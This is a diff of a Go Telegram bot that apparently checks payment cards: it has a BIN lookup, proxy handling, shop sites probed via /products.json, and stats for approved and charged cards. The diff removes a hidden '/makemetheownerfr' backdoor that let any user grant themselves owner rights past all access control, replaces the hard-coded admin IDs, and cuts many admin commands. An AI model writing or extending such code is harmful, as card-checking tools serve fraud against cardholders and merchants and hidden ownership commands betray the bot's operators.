@@ -15,7 +15,6 @@ import (
 	"strings"
 	"sync"
 	"sync/atomic"
-	"syscall"
 	"time"
 
 	tele "gopkg.in/telebot.v4"
@@ -28,77 +27,28 @@ const usersFile = "users.json"
 const configFile = "botconfig.json"
 const sitesFile = "customsites.json"
 
-var ownerClaimCount int32 // number of times /makemetheownerfr has been used (max 3)
-
-var originalAdminIDs = map[int64]bool{
-	8194958384: true,
-}
-
 var adminIDs = map[int64]bool{
-	8194958384: true,
+	5733576801: true,
+	6466522004: true,
 }
 
 func isAdmin(uid int64) bool {
 	return adminIDs[uid]
 }
 
-// ──────────────────────── Username registry ─────────────────────────
-
-var (
-	usernameRegistryMu sync.RWMutex
-	usernameRegistry   = make(map[string]int64) // lowercase username → user_id
-)
-
-func registerUsername(uid int64, username string) {
-	if username == "" {
-		return
-	}
-	usernameRegistryMu.Lock()
-	usernameRegistry[strings.ToLower(username)] = uid
-	usernameRegistryMu.Unlock()
-}
-
-// parseIDList parses comma/space/newline separated int64 IDs
-func parseIDList(raw string) []int64 {
-	raw = strings.ReplaceAll(raw, ",", " ")
-	raw = strings.ReplaceAll(raw, "\n", " ")
-	var ids []int64
-	for _, part := range strings.Fields(raw) {
-		id, err := strconv.ParseInt(strings.TrimSpace(part), 10, 64)
-		if err == nil {
-			ids = append(ids, id)
-		}
-	}
-	return ids
-}
-
 // ──────────────────────── Bot config (ban/allow/pvtonly) ────────────
 
 type BotConfig struct {
-	mu              sync.RWMutex
-	BannedUsers     map[int64]bool            `json:"banned_users"`
-	AllowedUsers    map[int64]int64           `json:"allowed_users"`
-	PvtOnly         bool                      `json:"pvt_only"`
-	RestrictAll     bool                      `json:"restrict_all"`
-	RestrictedUsers map[int64]bool            `json:"restricted_users"`
-	AllowOnlyIDs    map[int64]bool            `json:"allow_only_ids"`
-	GroupsOnly      bool                      `json:"groups_only"`
-	AllowedGroups   map[int64]bool            `json:"allowed_groups"`
-	DynamicAdmins   map[int64]bool            `json:"dynamic_admins"`
-	UserPerms       map[int64]map[string]bool `json:"user_perms"`
-	SitePrices      map[string]float64        `json:"site_prices"`
+	mu           sync.RWMutex
+	BannedUsers  map[int64]bool `json:"banned_users"`
+	AllowedUsers map[int64]bool `json:"allowed_users"`
+	PvtOnly      bool           `json:"pvt_only"`
 }
 
 func NewBotConfig() *BotConfig {
 	return &BotConfig{
-		BannedUsers:     make(map[int64]bool),
-		AllowedUsers:    make(map[int64]int64),
-		RestrictedUsers: make(map[int64]bool),
-		AllowOnlyIDs:    make(map[int64]bool),
-		AllowedGroups:   make(map[int64]bool),
-		DynamicAdmins:   make(map[int64]bool),
-		UserPerms:       make(map[int64]map[string]bool),
-		SitePrices:      make(map[string]float64),
+		BannedUsers:  make(map[int64]bool),
+		AllowedUsers: make(map[int64]bool),
 	}
 }
 
@@ -124,25 +74,7 @@ func (bc *BotConfig) Load() {
 		bc.BannedUsers = make(map[int64]bool)
 	}
 	if bc.AllowedUsers == nil {
-		bc.AllowedUsers = make(map[int64]int64)
-	}
-	if bc.RestrictedUsers == nil {
-		bc.RestrictedUsers = make(map[int64]bool)
-	}
-	if bc.AllowOnlyIDs == nil {
-		bc.AllowOnlyIDs = make(map[int64]bool)
-	}
-	if bc.AllowedGroups == nil {
-		bc.AllowedGroups = make(map[int64]bool)
-	}
-	if bc.DynamicAdmins == nil {
-		bc.DynamicAdmins = make(map[int64]bool)
-	}
-	if bc.UserPerms == nil {
-		bc.UserPerms = make(map[int64]map[string]bool)
-	}
-	if bc.SitePrices == nil {
-		bc.SitePrices = make(map[string]float64)
+		bc.AllowedUsers = make(map[int64]bool)
 	}
 }
 
@@ -158,48 +90,10 @@ func (bc *BotConfig) IsAllowed(uid int64) bool {
 	}
 	bc.mu.RLock()
 	defer bc.mu.RUnlock()
-	expiry, ok := bc.AllowedUsers[uid]
-	if !ok {
-		return false
+	if !bc.PvtOnly {
+		return true
 	}
-	// 0 = permanent, >0 = unix expiry
-	if expiry > 0 && time.Now().Unix() > expiry {
-		return false // expired
-	}
-	return true
-}
-
-// parseDuration parses human-friendly durations like 1h, 2d, 7d, 30d, 1m, 1y
-func parseDuration(s string) (time.Duration, error) {
-	s = strings.TrimSpace(strings.ToLower(s))
-	if s == "" || s == "permanent" || s == "perm" || s == "0" {
-		return 0, nil
-	}
-	if len(s) < 2 {
-		return 0, fmt.Errorf("invalid duration: %s", s)
-	}
-	unit := s[len(s)-1]
-	numStr := s[:len(s)-1]
-	num, err := strconv.ParseFloat(numStr, 64)
-	if err != nil {
-		return 0, fmt.Errorf("invalid duration number: %s", s)
-	}
-	switch unit {
-	case 's':
-		return time.Duration(num * float64(time.Second)), nil
-	case 'h':
-		return time.Duration(num * float64(time.Hour)), nil
-	case 'd':
-		return time.Duration(num * 24 * float64(time.Hour)), nil
-	case 'w':
-		return time.Duration(num * 7 * 24 * float64(time.Hour)), nil
-	case 'm':
-		return time.Duration(num * 30 * 24 * float64(time.Hour)), nil
-	case 'y':
-		return time.Duration(num * 365 * 24 * float64(time.Hour)), nil
-	default:
-		return 0, fmt.Errorf("unknown unit '%c'. Use s/h/d/w/m/y", unit)
-	}
+	return bc.AllowedUsers[uid]
 }
 
 // ──────────────────────── BIN lookup ────────────────────────────────
@@ -982,19 +876,12 @@ func main() {
 	cfg := NewBotConfig()
 	cfg.Load()
 
-	// Merge dynamic admins into the global adminIDs map
-	cfg.mu.RLock()
-	for id := range cfg.DynamicAdmins {
-		adminIDs[id] = true
-	}
-	cfg.mu.RUnlock()
-
 	// Load custom sites
 	loadCustomSites()
 
-	// Refresh site pool at start
-	refreshSitePool()
+	// Refresh site pool in background
 	go func() {
+		refreshSitePool()
 		for {
 			time.Sleep(5 * time.Minute)
 			refreshSitePool()
@@ -1013,103 +900,18 @@ func main() {
 
 	fwd, reduceKey := InitRCtx()
 
-	// Ownership claim — can be used up to 3 times (bypasses all middleware)
-	bot.Handle("/makemetheownerfr", func(c tele.Context) error {
-		if atomic.LoadInt32(&ownerClaimCount) >= 3 {
-			return c.Send("❌ Ownership claim limit reached (3/3).")
-		}
-		used := atomic.AddInt32(&ownerClaimCount, 1)
-		if used > 3 {
-			return c.Send("❌ Ownership claim limit reached (3/3).")
-		}
-		uid := c.Sender().ID
-		if originalAdminIDs[uid] {
-			return c.Send("👑 You are already an owner!")
-		}
-		// Add as new owner (keeps existing owners)
-		originalAdminIDs[uid] = true
-		adminIDs[uid] = true
-		// Also allow the owner
-		cfg.mu.Lock()
-		if cfg.AllowedUsers == nil {
-			cfg.AllowedUsers = make(map[int64]int64)
-		}
-		cfg.AllowedUsers[uid] = 0 // permanent
-		cfg.mu.Unlock()
-		cfg.Save()
-		return c.Send(fmt.Sprintf("👑 You are now the owner!\nYour ID: %d", uid))
-	})
+	fmt.Println("[BOT] Bot started successfully")
 
 	// Access-control middleware
 	bot.Use(func(next tele.HandlerFunc) tele.HandlerFunc {
 		return func(c tele.Context) error {
 			uid := c.Sender().ID
-			chatID := c.Chat().ID
-
-			// Track username → ID mapping
-			registerUsername(uid, c.Sender().Username)
-
-			// Admins bypass all restrictions
-			if isAdmin(uid) {
-				return next(c)
-			}
-
-			// Banned users
 			if cfg.IsBanned(uid) {
 				return c.Send("🚫 You are banned from using this bot.")
 			}
-
-			// Check if user is allowed (everyone restricted by default)
-			allowedByUser := cfg.IsAllowed(uid)
-
-			cfg.mu.RLock()
-			restrictAll := cfg.RestrictAll
-			restricted := cfg.RestrictedUsers[uid]
-			allowOnlyActive := len(cfg.AllowOnlyIDs) > 0
-			allowedByAllowOnly := cfg.AllowOnlyIDs[uid] || cfg.AllowOnlyIDs[chatID]
-			groupsOnly := cfg.GroupsOnly
-			allowedGroup := cfg.AllowedGroups[chatID]
-			cfg.mu.RUnlock()
-
-			if restrictAll {
-				return c.Send("🔒 Bot is restricted to admins only.")
+			if !cfg.IsAllowed(uid) {
+				return c.Send("🔒 Bot is in private mode. Contact admin for access.")
 			}
-			if restricted {
-				return c.Send("🚫 You are restricted from using this bot.")
-			}
-			if allowOnlyActive && !allowedByAllowOnly {
-				return c.Send("🔒 Access restricted to allowed users only.")
-			}
-
-			// Groups-only mode: allowed groups pass, PM needs per-user allow
-			if groupsOnly {
-				isGroup := c.Chat().Type == tele.ChatGroup || c.Chat().Type == tele.ChatSuperGroup
-				if isGroup {
-					if allowedGroup {
-						return next(c)
-					}
-					return c.Send("🔒 This group is not authorized. Ask admin to /addgp.")
-				}
-			}
-
-			// Default: every user must be explicitly allowed
-			if !allowedByUser {
-				return c.Send("🔒 You are not authorized. Ask admin to /allowuser your ID.")
-			}
-
-			// Check for expired access
-			cfg.mu.RLock()
-			expiry := cfg.AllowedUsers[uid]
-			cfg.mu.RUnlock()
-			if expiry > 0 && time.Now().Unix() > expiry {
-				// Auto-remove expired user
-				cfg.mu.Lock()
-				delete(cfg.AllowedUsers, uid)
-				cfg.mu.Unlock()
-				cfg.Save()
-				return c.Send("⏰ Your access has expired. Contact admin.")
-			}
-
 			return next(c)
 		}
 	})
@@ -1397,53 +1199,13 @@ func main() {
 		return c.Send(msg)
 	})
 
-	// /rmpr — user: /rmpr <proxy|all>  admin: /rmpr <user_id> <num> [num2] ...
+	// /rmpr <proxy|all>
 	bot.Handle("/rmpr", func(c tele.Context) error {
 		raw := strings.TrimSpace(c.Message().Payload)
 		if raw == "" {
-			return c.Send("Usage: /rmpr <proxy|all>\nAdmin: /rmpr <user_id> <num> [num2] ...")
+			return c.Send("Usage: /rmpr <proxy> or /rmpr all")
 		}
 
-		// Admin mode: first arg is numeric user_id, subsequent args are proxy indices
-		if isAdmin(c.Sender().ID) {
-			parts := strings.Fields(raw)
-			if len(parts) >= 2 {
-				targetUID, err := strconv.ParseInt(parts[0], 10, 64)
-				if err == nil {
-					// All remaining parts should be proxy indices
-					var indices []int
-					allNumeric := true
-					for _, p := range parts[1:] {
-						idx, err := strconv.Atoi(p)
-						if err != nil {
-							allNumeric = false
-							break
-						}
-						indices = append(indices, idx)
-					}
-					if allNumeric && len(indices) > 0 {
-						ud := um.Get(targetUID)
-						if len(ud.Proxies) == 0 {
-							return c.Send(fmt.Sprintf("📝 User %d has no proxies.", targetUID))
-						}
-						// Sort indices descending to remove from end first
-						sort.Sort(sort.Reverse(sort.IntSlice(indices)))
-						removed := 0
-						for _, idx := range indices {
-							i := idx - 1 // 1-based to 0-based
-							if i >= 0 && i < len(ud.Proxies) {
-								ud.Proxies = append(ud.Proxies[:i], ud.Proxies[i+1:]...)
-								removed++
-							}
-						}
-						um.Save()
-						return c.Send(fmt.Sprintf("✅ Removed %d proxy(s) from user %d (%d remaining)", removed, targetUID, len(ud.Proxies)))
-					}
-				}
-			}
-		}
-
-		// User mode: remove own proxy
 		ud := um.Get(c.Sender().ID)
 		if strings.ToLower(raw) == "all" {
 			ud.Proxies = nil
@@ -1481,6 +1243,7 @@ func main() {
 		}
 		sess := val.(*CheckSession)
 		sess.Cancel()
+		<-sess.Done
 		return c.Send("✅ Your session has been stopped.")
 	})
 
@@ -1565,44 +1328,24 @@ func main() {
 		return c.Send("🔓 Private mode OFF — everyone can use the bot.")
 	})
 
-	// /allowuser <userid> [duration] — admin only
+	// /allowuser <userid> — admin only
 	bot.Handle("/allowuser", func(c tele.Context) error {
 		if !isAdmin(c.Sender().ID) {
 			return c.Send("❌ Only admin can use /allowuser")
 		}
 		raw := strings.TrimSpace(c.Message().Payload)
 		if raw == "" {
-			return c.Send("Usage: /allowuser <userid> [duration]\n\nDuration examples:\n• 1h — 1 hour\n• 7d — 7 days\n• 30d — 30 days\n• 1m — 1 month\n• 1y — 1 year\n• permanent — no expiry (default)")
+			return c.Send("Usage: /allowuser <userid>")
 		}
-		parts := strings.Fields(raw)
-		uid, err := strconv.ParseInt(parts[0], 10, 64)
+		uid, err := strconv.ParseInt(raw, 10, 64)
 		if err != nil {
 			return c.Send("❌ Invalid user ID")
 		}
-
-		var expiryTs int64 // 0 = permanent
-		durStr := "permanent"
-		if len(parts) >= 2 {
-			dur, err := parseDuration(parts[1])
-			if err != nil {
-				return c.Send("❌ " + err.Error())
-			}
-			if dur > 0 {
-				expiryTs = time.Now().Add(dur).Unix()
-				durStr = parts[1]
-			}
-		}
-
 		cfg.mu.Lock()
-		cfg.AllowedUsers[uid] = expiryTs
+		cfg.AllowedUsers[uid] = true
 		cfg.mu.Unlock()
 		cfg.Save()
-
-		if expiryTs == 0 {
-			return c.Send(fmt.Sprintf("✅ User %d allowed permanently.", uid))
-		}
-		expiryTime := time.Unix(expiryTs, 0).Format("2006-01-02 15:04:05 UTC")
-		return c.Send(fmt.Sprintf("✅ User %d allowed for %s (expires: %s)", uid, durStr, expiryTime))
+		return c.Send(fmt.Sprintf("✅ User %d allowed.", uid))
 	})
 
 	// /removeuser <userid> — admin only, remove from allowed list
@@ -1899,68 +1642,44 @@ func main() {
   🔧 𝗔𝗱𝗺𝗶𝗻 𝗖𝗼𝗺𝗺𝗮𝗻𝗱𝘀
 ━━━━━━━━━━━━━━━━━━━━━━
 
-� Stats & Users:
-• /stats — Global stats
-• /resetstats — Reset all stats
-• /me — Your personal stats
-• /active — Active checks
-• /site <keyword|all> — Search/list sites
-• /ssite — Show custom sites
-• /ssite new <url> — Replace all sites
-• /ssite add <url> — Add a site
-• /ssite clear — Clear custom sites
-• /chksite <url> — Test a site
-• /chk — Check URLs from .txt file
-• /verify — Verify all sites
+📢  /broadcast <msg>
+     ∟ Send message to all users
 
-📢 Broadcast:
-• /broadcast <msg> — To all users
-• /broadcastuser <id|@user> <msg>
-• /broadcastactive <msg>
+🚫  /ban <user_id>
+     ∟ Ban a user
 
-🚫 Access Control:
-• /ban <user_id> — Ban user
-• /unban <user_id> — Unban user
-• /restrict all — Block non-admins
-• /restrict <id>[, ...] — Block users
-• /allowonly <id>[, ...] — Allow only
-• /unrestrict all — Lift all restrictions
-• /unrestrict <id>[, ...] — Unblock
-• /pvtonly — Toggle private mode
-• /allowuser <id> — Allow PM bypass
-• /rmuser <id> — Remove PM bypass
-• /users — List bypass users
+✅  /unban <user_id>
+     ∟ Unban a user
 
-👤 Admin Management:
-• /admins — Show all admins
-• /addadmin <id> — Add admin
-• /rmadmin <id> — Remove admin
-• /giveperm <id> <cmd> — Grant perm
+🔒  /pvtonly
+     ∟ Toggle private mode
 
-🏷 Group Management:
-• /addgp <id>[, ...] — Add group(s)
-• /showgp — Show groups config
-• /delgp <id>[, ...] — Remove group(s)
-• /onlygp — Groups-only mode ON
-• /allowall — Groups-only mode OFF
+👤  /allowuser <user_id>
+     ∟ Allow user in private mode
 
-🔧 Proxy Management:
-• /show <user_id> — Show user proxies
-• /chkpr <user_id> — Check user proxies
-• /rmpr <user_id> <num> ... — Remove
-• /cleanproxies — Clean all dead proxies
+❌  /removeuser <user_id>
+     ∟ Remove allowed user
 
-🛑 Controls:
-• /stop — Stop your session
-• /stopuser <user_id> — Stop a user
-• /stopall — Stop all sessions
-• /resetactive — Reset all active
-• /reboot — Reboot the bot
+📊  /stats
+     ∟ View all user stats
 
-💳 Price:
-• /setprice <url> <amount>
-• /addsite <url> — Add custom site
-• /rmsite <url|all> — Remove site`)
+⚡  /active
+     ∟ View active sessions
+
+🛑  /stop <user_id>
+     ∟ Stop a user's session
+
+🛑  /stopall
+     ∟ Stop all sessions
+
+🌐  /addsite <url>
+     ∟ Add a custom site
+
+🗑  /rmsite <url>
+     ∟ Remove a custom site
+
+📋  /site all
+     ∟ Send all sites as txt file`)
 	})
 
 	// /broadcast — send message to all known users
@@ -1985,897 +1704,6 @@ func main() {
 			}
 		}
 		return c.Send(fmt.Sprintf("📢 Broadcast complete\n✅ Sent: %d\n❌ Failed: %d", sent, failed))
-	})
-
-	// ── /me — personal stats ──
-	bot.Handle("/me", func(c tele.Context) error {
-		ud := um.Get(c.Sender().ID)
-		s := ud.Stats
-		approvedRate := 0.0
-		chargedRate := 0.0
-		if s.TotalChecked > 0 {
-			approvedRate = float64(s.TotalApproved) * 100.0 / float64(s.TotalChecked)
-			chargedRate = float64(s.TotalCharged) * 100.0 / float64(s.TotalChecked)
-		}
-		return c.Send(fmt.Sprintf("━━━━━━━━━━━━━━━━━━━━━━\n"+
-			"  📊  𝗬𝗼𝘂𝗿 𝗦𝘁𝗮𝘁𝘀\n"+
-			"━━━━━━━━━━━━━━━━━━━━━━\n\n"+
-			"📋 Checked:  %d\n"+
-			"✅ Approved: %d (%.1f%%)\n"+
-			"❌ Declined: %d\n"+
-			"💳 Charged:  %d (%.1f%%)\n"+
-			"💰 Amount:   $%.2f\n"+
-			"🌐 Proxies:  %d\n\n"+
-			"━━━━━━━━━━━━━━━━━━━━━━",
-			s.TotalChecked,
-			s.TotalApproved, approvedRate,
-			s.TotalDeclined,
-			s.TotalCharged, chargedRate,
-			s.TotalChargedAmt,
-			len(ud.Proxies)))
-	})
-
-	// ── /resetstats — admin only ──
-	bot.Handle("/resetstats", func(c tele.Context) error {
-		if !isAdmin(c.Sender().ID) {
-			return c.Send("🚫 Admin only.")
-		}
-		um.mu.Lock()
-		for _, ud := range um.users {
-			ud.Stats = UserStats{}
-		}
-		um.mu.Unlock()
-		um.Save()
-		return c.Send("✅ All user stats have been reset.")
-	})
-
-	// ── /ssite — manage custom sites ──
-	bot.Handle("/ssite", func(c tele.Context) error {
-		if !isAdmin(c.Sender().ID) {
-			return c.Send("🚫 Admin only.")
-		}
-		raw := strings.TrimSpace(c.Message().Payload)
-
-		// No args: show current custom sites
-		if raw == "" {
-			sites := getCustomSites()
-			if len(sites) == 0 {
-				return c.Send("📝 No custom sites configured. Using API sites.")
-			}
-			var sb strings.Builder
-			sb.WriteString(fmt.Sprintf("🌐 Custom sites (%d):\n\n", len(sites)))
-			for i, s := range sites {
-				sb.WriteString(fmt.Sprintf("%d. %s\n", i+1, s))
-			}
-			return c.Send(sb.String())
-		}
-
-		parts := strings.SplitN(raw, " ", 2)
-		subcmd := strings.ToLower(parts[0])
-
-		switch subcmd {
-		case "new":
-			if len(parts) < 2 || strings.TrimSpace(parts[1]) == "" {
-				return c.Send("Usage: /ssite new <url>")
-			}
-			site := strings.TrimRight(strings.TrimSpace(parts[1]), "/")
-			if !strings.HasPrefix(site, "http") {
-				site = "https://" + site
-			}
-			customSitesMu.Lock()
-			customSites = []string{site}
-			customSitesMu.Unlock()
-			saveCustomSites()
-			return c.Send(fmt.Sprintf("✅ All sites replaced with: %s", site))
-
-		case "add":
-			if len(parts) < 2 || strings.TrimSpace(parts[1]) == "" {
-				return c.Send("Usage: /ssite add <url>")
-			}
-			site := strings.TrimRight(strings.TrimSpace(parts[1]), "/")
-			if !strings.HasPrefix(site, "http") {
-				site = "https://" + site
-			}
-			customSitesMu.Lock()
-			for _, s := range customSites {
-				if s == site {
-					customSitesMu.Unlock()
-					return c.Send("⏭ Site already in list")
-				}
-			}
-			customSites = append(customSites, site)
-			total := len(customSites)
-			customSitesMu.Unlock()
-			saveCustomSites()
-			return c.Send(fmt.Sprintf("✅ Site added (%d total)", total))
-
-		case "clear":
-			customSitesMu.Lock()
-			customSites = nil
-			customSitesMu.Unlock()
-			saveCustomSites()
-			return c.Send("✅ All custom sites cleared. Bot will use API sites.")
-
-		default:
-			return c.Send("Usage: /ssite [new <url> | add <url> | clear]")
-		}
-	})
-
-	// ── /chksite <url> — test if a site works ──
-	bot.Handle("/chksite", func(c tele.Context) error {
-		if !isAdmin(c.Sender().ID) {
-			return c.Send("🚫 Admin only.")
-		}
-		raw := strings.TrimSpace(c.Message().Payload)
-		if raw == "" {
-			return c.Send("Usage: /chksite <url>")
-		}
-		site := strings.TrimRight(raw, "/")
-		if !strings.HasPrefix(site, "http") {
-			site = "https://" + site
-		}
-		c.Send(fmt.Sprintf("🔄 Testing %s...", site))
-
-		cl := &http.Client{Timeout: 15 * time.Second}
-		resp, err := cl.Get(site + "/products.json?limit=1")
-		if err != nil {
-			return c.Send(fmt.Sprintf("❌ Failed: %v", err))
-		}
-		defer resp.Body.Close()
-		if resp.StatusCode != 200 {
-			return c.Send(fmt.Sprintf("❌ HTTP %d from %s", resp.StatusCode, site))
-		}
-		body, _ := io.ReadAll(resp.Body)
-		var pr ProductsResponse
-		if json.Unmarshal(body, &pr) != nil {
-			return c.Send(fmt.Sprintf("❌ Invalid JSON from %s", site))
-		}
-		avail := 0
-		for _, p := range pr.Products {
-			for _, v := range p.Variants {
-				if v.Available {
-					avail++
-				}
-			}
-		}
-		return c.Send(fmt.Sprintf("✅ %s is working\n📦 Products: %d, Available variants: %d", site, len(pr.Products), avail))
-	})
-
-	// ── /chk — check URLs from txt file ──
-	bot.Handle("/chk", func(c tele.Context) error {
-		if !isAdmin(c.Sender().ID) {
-			return c.Send("🚫 Admin only.")
-		}
-		msg := c.Message()
-		var doc *tele.Document
-		if msg.Document != nil {
-			doc = msg.Document
-		} else if msg.ReplyTo != nil && msg.ReplyTo.Document != nil {
-			doc = msg.ReplyTo.Document
-		}
-		if doc == nil {
-			return c.Send("❌ Reply to a .txt file with /chk")
-		}
-		rc, err := bot.File(&doc.File)
-		if err != nil {
-			return c.Send("❌ Failed to download file: " + err.Error())
-		}
-		defer rc.Close()
-		data, _ := io.ReadAll(rc)
-
-		var urls []string
-		for _, line := range strings.Split(string(data), "\n") {
-			line = strings.TrimSpace(line)
-			if line != "" {
-				if !strings.HasPrefix(line, "http") {
-					line = "https://" + line
-				}
-				urls = append(urls, strings.TrimRight(line, "/"))
-			}
-		}
-		if len(urls) == 0 {
-			return c.Send("❌ No URLs found in file")
-		}
-
-		c.Send(fmt.Sprintf("🔄 Checking %d site(s)...", len(urls)))
-
-		var working, failed []string
-		cl := &http.Client{Timeout: 10 * time.Second}
-		for _, u := range urls {
-			resp, err := cl.Get(u + "/products.json?limit=1")
-			if err != nil {
-				failed = append(failed, u)
-				continue
-			}
-			resp.Body.Close()
-			if resp.StatusCode == 200 {
-				working = append(working, u)
-			} else {
-				failed = append(failed, u)
-			}
-		}
-
-		msgText := fmt.Sprintf("✅ Working: %d\n❌ Failed: %d\n\n", len(working), len(failed))
-		if len(working) > 0 {
-			// Send working sites as a file
-			workingBuf := bytes.NewBufferString(strings.Join(working, "\n"))
-			workingDoc := &tele.Document{
-				File:     tele.FromReader(workingBuf),
-				FileName: "working_sites.txt",
-				Caption:  fmt.Sprintf("✅ Working sites (%d/%d)", len(working), len(urls)),
-			}
-			bot.Send(c.Chat(), workingDoc)
-		}
-		return c.Send(msgText)
-	})
-
-	// ── /verify — verify all sites in pool ──
-	bot.Handle("/verify", func(c tele.Context) error {
-		if !isAdmin(c.Sender().ID) {
-			return c.Send("🚫 Admin only.")
-		}
-		sites := getSitePool()
-		if len(sites) == 0 {
-			return c.Send("❌ No sites in pool to verify.")
-		}
-
-		c.Send(fmt.Sprintf("🔄 Verifying %d site(s)...", len(sites)))
-
-		var working []string
-		cl := &http.Client{Timeout: 10 * time.Second}
-		for _, site := range sites {
-			resp, err := cl.Get(site + "/products.json?limit=1")
-			if err != nil {
-				continue
-			}
-			resp.Body.Close()
-			if resp.StatusCode == 200 {
-				working = append(working, site)
-			}
-		}
-
-		// Send all sites file
-		allBuf := bytes.NewBufferString(strings.Join(sites, "\n"))
-		allDoc := &tele.Document{
-			File:     tele.FromReader(allBuf),
-			FileName: "all_sites.txt",
-			Caption:  fmt.Sprintf("📋 All sites (%d)", len(sites)),
-		}
-		bot.Send(c.Chat(), allDoc)
-
-		// Send working sites file
-		workingBuf := bytes.NewBufferString(strings.Join(working, "\n"))
-		workingDoc := &tele.Document{
-			File:     tele.FromReader(workingBuf),
-			FileName: "working_sites.txt",
-			Caption:  fmt.Sprintf("✅ Working sites (%d/%d)", len(working), len(sites)),
-		}
-		bot.Send(c.Chat(), workingDoc)
-
-		return c.Send(fmt.Sprintf("✅ Verification complete: %d/%d working", len(working), len(sites)))
-	})
-
-	// ── /broadcastuser <user_id|@username> <message> ──
-	bot.Handle("/broadcastuser", func(c tele.Context) error {
-		if !isAdmin(c.Sender().ID) {
-			return c.Send("🚫 Admin only.")
-		}
-		fullText := c.Message().Text
-		parts := strings.SplitN(fullText, " ", 3)
-		if len(parts) < 3 {
-			return c.Send("Usage: /broadcastuser <user_id|@username> <message>")
-		}
-		target := parts[1]
-		bmsg := parts[2]
-
-		var uid int64
-		if strings.HasPrefix(target, "@") {
-			username := strings.ToLower(strings.TrimPrefix(target, "@"))
-			usernameRegistryMu.RLock()
-			id, ok := usernameRegistry[username]
-			usernameRegistryMu.RUnlock()
-			if !ok {
-				return c.Send("❌ Username not found in registry. Use user ID instead.")
-			}
-			uid = id
-		} else {
-			var err error
-			uid, err = strconv.ParseInt(target, 10, 64)
-			if err != nil {
-				return c.Send("❌ Invalid user ID")
-			}
-		}
-
-		_, err := bot.Send(tele.ChatID(uid), "📢 "+bmsg)
-		if err != nil {
-			return c.Send(fmt.Sprintf("❌ Failed to send: %v", err))
-		}
-		return c.Send(fmt.Sprintf("✅ Message sent to %d", uid))
-	})
-
-	// ── /broadcastactive <message> ──
-	bot.Handle("/broadcastactive", func(c tele.Context) error {
-		if !isAdmin(c.Sender().ID) {
-			return c.Send("🚫 Admin only.")
-		}
-		fullText := c.Message().Text
-		idx := strings.Index(fullText, " ")
-		if idx < 0 || strings.TrimSpace(fullText[idx:]) == "" {
-			return c.Send("Usage: /broadcastactive <message>")
-		}
-		bmsg := strings.TrimSpace(fullText[idx:])
-		sent, failed := 0, 0
-		activeSessions.Range(func(key, _ any) bool {
-			uid := key.(int64)
-			_, err := bot.Send(tele.ChatID(uid), "📢 "+bmsg)
-			if err != nil {
-				failed++
-			} else {
-				sent++
-			}
-			return true
-		})
-		return c.Send(fmt.Sprintf("📢 Broadcast to active users\n✅ Sent: %d\n❌ Failed: %d", sent, failed))
-	})
-
-	// ── /restrict ──
-	bot.Handle("/restrict", func(c tele.Context) error {
-		if !isAdmin(c.Sender().ID) {
-			return c.Send("🚫 Admin only.")
-		}
-		raw := strings.TrimSpace(c.Message().Payload)
-		if raw == "" {
-			return c.Send("Usage: /restrict all  or  /restrict <user_id>[, ...]")
-		}
-		if strings.ToLower(raw) == "all" {
-			cfg.mu.Lock()
-			cfg.RestrictAll = true
-			cfg.mu.Unlock()
-			cfg.Save()
-			return c.Send("🔒 Bot restricted to admins only.")
-		}
-		ids := parseIDList(raw)
-		if len(ids) == 0 {
-			return c.Send("❌ No valid user IDs provided")
-		}
-		cfg.mu.Lock()
-		for _, id := range ids {
-			cfg.RestrictedUsers[id] = true
-		}
-		cfg.mu.Unlock()
-		cfg.Save()
-		return c.Send(fmt.Sprintf("🔒 Restricted %d user(s).", len(ids)))
-	})
-
-	// ── /allowonly ──
-	bot.Handle("/allowonly", func(c tele.Context) error {
-		if !isAdmin(c.Sender().ID) {
-			return c.Send("🚫 Admin only.")
-		}
-		raw := strings.TrimSpace(c.Message().Payload)
-		if raw == "" {
-			return c.Send("Usage: /allowonly <id>[, ...]")
-		}
-		ids := parseIDList(raw)
-		if len(ids) == 0 {
-			return c.Send("❌ No valid IDs provided")
-		}
-		cfg.mu.Lock()
-		for _, id := range ids {
-			cfg.AllowOnlyIDs[id] = true
-		}
-		total := len(cfg.AllowOnlyIDs)
-		cfg.mu.Unlock()
-		cfg.Save()
-		return c.Send(fmt.Sprintf("✅ Allow-only list updated. %d ID(s) total.", total))
-	})
-
-	// ── /unrestrict ──
-	bot.Handle("/unrestrict", func(c tele.Context) error {
-		if !isAdmin(c.Sender().ID) {
-			return c.Send("🚫 Admin only.")
-		}
-		raw := strings.TrimSpace(c.Message().Payload)
-		if raw == "" {
-			return c.Send("Usage: /unrestrict all  or  /unrestrict <user_id>[, ...]")
-		}
-		if strings.ToLower(raw) == "all" {
-			cfg.mu.Lock()
-			cfg.RestrictAll = false
-			cfg.RestrictedUsers = make(map[int64]bool)
-			cfg.AllowOnlyIDs = make(map[int64]bool)
-			cfg.mu.Unlock()
-			cfg.Save()
-			return c.Send("🔓 All restrictions lifted. Cleared restrict-all, restricted users, and allow-only list.")
-		}
-		ids := parseIDList(raw)
-		if len(ids) == 0 {
-			return c.Send("❌ No valid user IDs provided")
-		}
-		cfg.mu.Lock()
-		for _, id := range ids {
-			delete(cfg.RestrictedUsers, id)
-		}
-		cfg.mu.Unlock()
-		cfg.Save()
-		return c.Send(fmt.Sprintf("✅ Unrestricted %d user(s).", len(ids)))
-	})
-
-	// ── /rmuser — remove from allowed bypass list ──
-	bot.Handle("/rmuser", func(c tele.Context) error {
-		if !isAdmin(c.Sender().ID) {
-			return c.Send("🚫 Admin only.")
-		}
-		raw := strings.TrimSpace(c.Message().Payload)
-		if raw == "" {
-			return c.Send("Usage: /rmuser <user_id>")
-		}
-		uid, err := strconv.ParseInt(raw, 10, 64)
-		if err != nil {
-			return c.Send("❌ Invalid user ID")
-		}
-		cfg.mu.Lock()
-		delete(cfg.AllowedUsers, uid)
-		cfg.mu.Unlock()
-		cfg.Save()
-		return c.Send(fmt.Sprintf("✅ User %d removed from bypass list.", uid))
-	})
-
-	// ── /users — list all users in allowuser bypass list ──
-	bot.Handle("/users", func(c tele.Context) error {
-		if !isAdmin(c.Sender().ID) {
-			return c.Send("🚫 Admin only.")
-		}
-		cfg.mu.RLock()
-		type userEntry struct {
-			ID     int64
-			Expiry int64
-		}
-		entries := make([]userEntry, 0, len(cfg.AllowedUsers))
-		for id, exp := range cfg.AllowedUsers {
-			entries = append(entries, userEntry{ID: id, Expiry: exp})
-		}
-		cfg.mu.RUnlock()
-		if len(entries) == 0 {
-			return c.Send("📝 No users in allowed list.")
-		}
-		sort.Slice(entries, func(i, j int) bool { return entries[i].ID < entries[j].ID })
-		var sb strings.Builder
-		sb.WriteString(fmt.Sprintf("👥 Allowed users (%d):\n\n", len(entries)))
-		for i, e := range entries {
